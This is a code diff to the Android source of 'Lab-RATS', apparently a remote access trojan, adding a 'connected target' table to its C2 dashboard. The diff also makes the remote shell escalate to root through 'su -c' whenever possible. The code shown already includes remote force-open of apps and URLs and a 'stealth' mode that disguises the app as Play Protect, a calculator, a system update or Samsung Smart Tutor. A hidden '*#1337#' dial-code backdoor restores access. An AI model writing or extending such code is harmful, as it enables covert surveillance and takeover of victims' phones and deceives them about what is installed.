@@ -10,6 +10,7 @@ import android.util.Log;
 
 import com.labs.labrats.Constants;
 import com.labs.labrats.FirebaseConfig;
+import com.labs.labrats.IO_Persistence_Manager;
 import com.labs.labrats.LabRatsWorker;
 import com.labs.labrats.MainActivity;
 import com.labs.labrats.StatusNotification;
@@ -39,6 +40,8 @@ public class TerminalModule extends BaseModule {
 
         if (uri.equals("/") || uri.equals("/terminal") || uri.isEmpty()) {
             return serveHome(session);
+        } else if (uri.equals("/terminal/targets")) {
+            return serveTargets();
         } else if (uri.equals("/terminal/restart")) {
             return restartServer();
         } else if (uri.equals("/terminal/clear-logs")) {
@@ -53,8 +56,6 @@ public class TerminalModule extends BaseModule {
 
     private Response serveHome(IHTTPSession session) {
         WorkManager_Sync.notifyOperatorActivity();
-        String ip = MainActivity.getLocalIpAddress();
-        String ipDisplay = (ip != null ? ip : "NOT_DETECTED");
         String sessionId = FirebaseConfig.getSessionId();
 
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
@@ -62,35 +63,40 @@ public class TerminalModule extends BaseModule {
         // Status Monitor Card
         html.append("<div class=\"card\">");
         String snifferStatus = StatusNotification.isServiceRunning() ? 
-            "<span style=\"color:var(--neon-green); font-size:0.65rem; vertical-align:middle;\">INTEL_ACTIVE</span>" : 
-            "<span style=\"color:var(--danger); font-size:0.65rem; vertical-align:middle;\">INTEL_OFFLINE</span>";
+            "<span style=\"color:var(--neon-green); font-size:0.7rem; vertical-align:middle;\">INTEL_ACTIVE</span>" :
+            "<span style=\"color:var(--danger); font-size:0.7rem; vertical-align:middle;\">INTEL_OFFLINE</span>";
         html.append("<h2 style=\"margin:0; letter-spacing:1px; line-height:1.2; text-align: left; font-size: 1.6rem;\">SYSTEM_MONITOR ").append(snifferStatus).append("</h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
 
         html.append("<div style=\"margin-top: 15px;\">");
-        html.append("<div style=\"font-size:0.6rem; opacity:0.5; font-family:monospace; margin-bottom:15px; text-align: left;\">SESSION_ID: ").append(sessionId).append("</div>");
-        
-        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; justify-content: center;\">");
-        
-        // Server Status
-        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">UPLINK_STATUS</div>");
-        html.append("<div style=\"font-size: 1.6rem; font-weight: bold; color: var(--neon-green); margin-top: 10px;\">ONLINE</div>");
+        html.append("<div style=\"font-size:0.8rem; opacity:0.5; font-family:monospace; margin-bottom:15px; text-align: left;\">SESSION_ID: ").append(sessionId).append("</div>");
+
+        // Connected Target Table inside System Monitor Card
+        html.append("<div style=\"width: 100%; overflow-x: auto; margin-top: 15px; border-radius: 12px; border: 1px solid rgba(0, 242, 255, 0.25); background: rgba(0, 0, 0, 0.4); padding: 15px; box-sizing: border-box;\">");
+        html.append("<div style=\"display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;\">");
+        html.append("<div style=\"font-size: 0.75rem; color: var(--neon-cyan); letter-spacing: 2px; font-weight: bold; text-transform: uppercase;\">CONNECTED TARGET <span style=\"color:#888; font-size:0.65rem; font-weight:normal;\">(LIVE AUTO-REFRESH 20s)</span></div>");
+        html.append("<button type=\"button\" onclick=\"refreshTargetsTable()\" class=\"btn btn-small\" style=\"margin:0; padding:6px 12px; font-size:0.65rem; border-color:var(--neon-cyan); color:var(--neon-cyan); background:#000 !important;\">REFRESH TARGET</button>");
         html.append("</div>");
-        
-        // Port
-        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">ACCESS_PORT</div>");
-        html.append("<div style=\"font-size: 1.6rem; font-weight: bold; color: var(--neon-cyan); margin-top: 10px;\">").append(server.getListeningPort()).append("</div>");
+
+        html.append("<table style=\"width: 100%; border-collapse: separate; border-spacing: 0 4px; font-family: monospace; font-size: 0.75rem; text-align: left;\">");
+        html.append("<thead>");
+        html.append("<tr style=\"color: var(--neon-cyan); text-transform: uppercase; font-size: 0.7rem; border-bottom: 1px solid rgba(0,242,255,0.2);\">");
+        html.append("<th style=\"padding: 8px 10px;\">DEVICE ID</th>");
+        html.append("<th style=\"padding: 8px 10px;\">MODEL</th>");
+        html.append("<th style=\"padding: 8px 10px;\">OS VERSION</th>");
+        html.append("<th style=\"padding: 8px 10px;\">BATTERY</th>");
+        html.append("<th style=\"padding: 8px 10px;\">ENDPOINT IP</th>");
+        html.append("<th style=\"padding: 8px 10px;\">STATUS</th>");
+        html.append("<th style=\"padding: 8px 10px;\">PROFILE</th>");
+        html.append("<th style=\"padding: 8px 10px;\">LAST CHECK-IN</th>");
+        html.append("</tr>");
+        html.append("</thead>");
+        html.append("<tbody id=\"targets-table-body\">");
+        html.append("<tr><td colspan=\"8\" style=\"padding: 15px; text-align: center; color: #888;\">Loading connected targets...</td></tr>");
+        html.append("</tbody>");
+        html.append("</table>");
         html.append("</div>");
-        
-        // IP
-        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">VIRTUAL_ADDRESS</div>");
-        html.append("<div style=\"font-size: 1.2rem; font-weight: bold; color: var(--neon-cyan); word-break: break-all; margin-top: 10px;\">").append(ipDisplay).append("</div>");
-        html.append("</div>");
-        
-        html.append("</div>");
+
         html.append("</div>");
         html.append("</div>"); // Close Status Monitor card
 
@@ -123,7 +129,7 @@ public class TerminalModule extends BaseModule {
         html.append("</div>");
         html.append("<div style=\"border-top: 1px solid rgba(0, 242, 255, 0.1); padding: 10px; display: flex; align-items: center; background: rgba(0,0,0,0.5);\">");
         html.append("<span id=\"terminal-prompt\" style=\"color: var(--terminal-green); font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; margin-right: 10px; white-space: nowrap;\">root@Android:").append(escapeHtml(currentShellPath)).append(promptSymbol).append("</span>");
-        html.append("<input id=\"shell-cmd\" type=\"text\" autocapitalize=\"none\" autocorrect=\"off\" autocomplete=\"off\" spellcheck=\"false\" placeholder=\"enter command...\" style=\"background: transparent; border: none; color: #fff; outline: none; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; flex-grow: 1; padding: 5px 0;\">");
+        html.append("<input id=\"shell-cmd\" type=\"text\" autocapitalize=\"none\" autocorrect=\"off\" autocomplete=\"off\" spellcheck=\"false\" placeholder=\"enter command...\" style=\"background: transparent !important; border: none !important; border-color: transparent !important; outline: none !important; box-shadow: none !important; color: #fff; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; flex-grow: 1; padding: 5px 0;\">");
         html.append("</div>");
         html.append("</div>");
         html.append("<div class=\"terminal-input-wrap\" style=\"margin-top: 15px; display: flex; justify-content: center; gap: 10px; flex-wrap: wrap;\">");
@@ -138,7 +144,7 @@ public class TerminalModule extends BaseModule {
         
         // 1. Device Sound Setting
         html.append("<div style=\"margin-bottom: 25px;\">");
-        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-green); font-size: 0.7rem;\">DEVICE_SOUND_SETTING</div>");
+        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-green); font-size: 0.8rem;\">DEVICE_SOUND_SETTING</div>");
         html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
         html.append("<select id=\"device-cmd-selector\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-green); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
         html.append("<option value=\"vibrate\">VIBRATE_DEVICE</option>");
@@ -150,7 +156,7 @@ public class TerminalModule extends BaseModule {
 
         // 2. Force Open App
         html.append("<div style=\"margin-bottom: 25px;\">");
-        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-cyan); font-size: 0.7rem;\">FORCE_OPEN_APP</div>");
+        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-cyan); font-size: 0.8rem;\">FORCE_OPEN_APP</div>");
         html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
         html.append("<select id=\"app-selector\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
         html.append("<option value=\"\" style=\"background:#000;\">Select App...</option>");
@@ -163,7 +169,7 @@ public class TerminalModule extends BaseModule {
 
         // 3. Force Open URL
         html.append("<div style=\"margin-bottom: 25px;\">");
-        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-cyan); font-size: 0.7rem;\">FORCE_OPEN_URL</div>");
+        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-cyan); font-size: 0.8rem;\">FORCE_OPEN_URL</div>");
         html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
         html.append("<input id=\"target-url\" type=\"text\" placeholder=\"https://example.com\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
         html.append("<button onclick=\"openUrl()\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); width: 210px !important; margin: 0;\">EXECUTE</button>");
@@ -175,30 +181,31 @@ public class TerminalModule extends BaseModule {
         html.append("<h2 style=\"color: var(--neon-orange); font-size: 1.15rem; text-align: left;\">STEALTH_OPERATIONS <span class=\"info-trigger\" onclick=\"showInfo(event, 'STEALTH_OPERATIONS', 'Advanced application camouflage. Choose an identity to masquerade as a functional decoy. Use dial pad code &lt;b&gt;*#1337#&lt;/b&gt; or the hidden backdoor to restore access.')\">INFO</span></h2>");
         
         html.append("<div style=\"margin-bottom: 15px; display: flex; flex-direction: column; align-items: flex-start;\">");
-        html.append("<label class=\"info-label\" style=\"align-self: flex-start; font-size: 0.7rem;\">MASQUERADE_IDENTITY:</label>");
+        html.append("<label for=\"stealth-type\" class=\"info-label\" style=\"align-self: flex-start; font-size: 0.8rem;\">MASQUERADE_IDENTITY:</label>");
         html.append("<select id=\"stealth-type\" style=\"width:100%; max-width:450px; background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border:1px solid var(--neon-orange); color:#fff; padding:10px; border-radius:8px; outline:none; font-family:monospace; margin-top:5px;\">");
         html.append("<option value=\"settings\">Play Protect (Google Shield)</option>");
-        html.append("<option value=\"calc\">Calculator (Apple Style)</option>");
-        html.append("<option value=\"weather\">Weather (Blue Sky Forecast)</option>");
-        html.append("<option value=\"update\">System Update (System Config)</option>");
+        html.append("<option value=\"calc\">Calculator</option>");
+        html.append("<option value=\"weather\">Weather</option>");
+        html.append("<option value=\"update\">System Update</option>");
+        html.append("<option value=\"smarttutor\">Smart Tutor (Samsung Remote Care)</option>");
         html.append("<option value=\"logo\">Lab-RATS Logo (Unmasked)</option>");
+        html.append("<option value=\"systemstability\">System Stability Service (Unmasked)</option>");
         html.append("</select>");
         html.append("</div>");
 
         html.append("<div class=\"btn-container\" style=\"display:flex; flex-direction:column; gap:10px; align-items: flex-start;\">");
         html.append("<button onclick=\"toggleStealth()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255, 157, 0, 0.05); border-radius:12px; padding: 10px 25px;\">INITIATE_STEALTH</button>");
-        html.append("<button onclick=\"restoreNormal()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); border-radius:12px; padding: 10px 25px;\">RESTORE_NORMAL</button>");
         html.append("</div>");
         html.append("</div>");
 
         // --- CHANGE ACCESS KEY SECTION ---
         html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-cyan);\">");
-        html.append("<h2 style=\"color: var(--neon-cyan); text-align: left; margin-bottom: 25px; font-size: 1.15rem;\">SECURITY_PROTOCOL <span class=\"info-trigger\" onclick=\"showInfo(event, 'SECURITY_PROTOCOL', 'Update login password for the remote C2 interface.')\">INFO</span></h2>");
+        html.append("<h2 style=\"color: var(--neon-cyan); text-align: left; margin-bottom: 25px; font-size: 1.15rem;\">SECURE_LOGIN <span class=\"info-trigger\" onclick=\"showInfo(event, 'SECURE_LOGIN', 'Update login passcode for C2 Dashboard.')\">INFO</span></h2>");
         html.append("<div style=\"display: flex; flex-direction: column; align-items: flex-start;\">");
-        html.append("<div style=\"width: 100%; max-width: 660px;\">");
-        html.append("<form action=\"/settings/password\" method=\"POST\" class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 10px;\">");
-        html.append("<input name=\"new_password\" type=\"password\" placeholder=\"ENTER_NEW_KEY\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
-        html.append("<button type=\"submit\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); padding: 10px; font-size: 0.7rem; width: 210px !important; text-align: center; margin: 0;\">UPDATE_KEY</button>");
+        html.append("<div style=\"width: 100%; max-width: 720px;\">");
+        html.append("<form action=\"/settings/password\" method=\"POST\" class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 10px; align-items: center; flex-wrap: wrap;\">");
+        html.append("<input id=\"new_pass_input\" name=\"new_password\" type=\"password\" placeholder=\"ENTER C2 PASSCODE\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 260px; height: 45px;\">");
+        html.append("<button type=\"submit\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); padding: 10px 20px; font-size: 0.75rem; width: auto !important; min-width: 180px; white-space: nowrap; text-align: center; margin: 0; display: inline-flex; align-items: center; justify-content: center; height: 45px;\">UPDATE_PASSWORD</button>");
         html.append("</form></div></div></div>");
 
         // --- DANGER ZONE SECTION ---
@@ -228,6 +235,57 @@ public class TerminalModule extends BaseModule {
         FirebaseConfig.clearSystemLogs();
         FirebaseConfig.logActivity("SYSTEM_MAINTENANCE: Session logs cleared");
         return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+    }
+
+    private Response serveTargets() {
+        try {
+            org.json.JSONObject obj = new org.json.JSONObject();
+
+            String deviceId = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).getString("device_alias", "samsung");
+            if (deviceId.isEmpty()) deviceId = "samsung";
+
+            String model = Build.MODEL != null ? Build.MODEL : "SM-F766W";
+            String osVersion = "Android " + Build.VERSION.RELEASE;
+
+            int batteryLevel = 100;
+            try {
+                android.os.BatteryManager bm = (android.os.BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
+                if (bm != null) {
+                    batteryLevel = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
+                }
+            } catch (Exception ignored) {}
+            String battery = batteryLevel + "%";
+
+            String ip = MainActivity.getLocalIpAddress();
+            String port = String.valueOf(server != null ? server.getListeningPort() : 9191);
+            String endpointIp = (ip != null ? ip : "127.0.0.1") + ":" + port;
+
+            boolean isOnline = IO_Persistence_Manager.getInstance() != null;
+            String status = isOnline ? "ONLINE" : "OFFLINE";
+
+            boolean isStealth = SystemAnalytics.isStealthEnabled(context);
+            String profile = isStealth ? "STEALTH" : "NORMAL";
+
+            String lastCheckIn = new java.text.SimpleDateFormat("M/d/yyyy, h:mm:ss a", java.util.Locale.US).format(new java.util.Date());
+
+            org.json.JSONArray list = new org.json.JSONArray();
+            org.json.JSONObject dev = new org.json.JSONObject();
+            dev.put("deviceId", deviceId);
+            dev.put("model", model);
+            dev.put("osVersion", osVersion);
+            dev.put("battery", battery);
+            dev.put("endpointIp", endpointIp);
+            dev.put("status", status);
+            dev.put("profile", profile);
+            dev.put("lastCheckIn", lastCheckIn);
+            list.put(dev);
+
+            obj.put("success", true);
+            obj.put("targets", list);
+            return newResponse(Response.Status.OK, "application/json", obj.toString());
+        } catch (Exception e) {
+            return newResponse(Response.Status.OK, "application/json", "{\"success\": false}");
+        }
     }
 
     private Response serveLogs(Map<String, String> params) {
@@ -595,7 +653,9 @@ public class TerminalModule extends BaseModule {
                 workingDir = new File(currentShellPath);
             }
 
-            ProcessBuilder pb = new ProcessBuilder("sh", "-c", command);
+            // Automatic Root Shell Elevation if SU binary is present on rooted device
+            boolean useRoot = SystemAnalytics.isRooted() && !command.startsWith("termux") && !command.startsWith("su");
+            ProcessBuilder pb = useRoot ? new ProcessBuilder("su", "-c", command) : new ProcessBuilder("sh", "-c", command);
             pb.directory(workingDir);
             pb.redirectErrorStream(true);
 
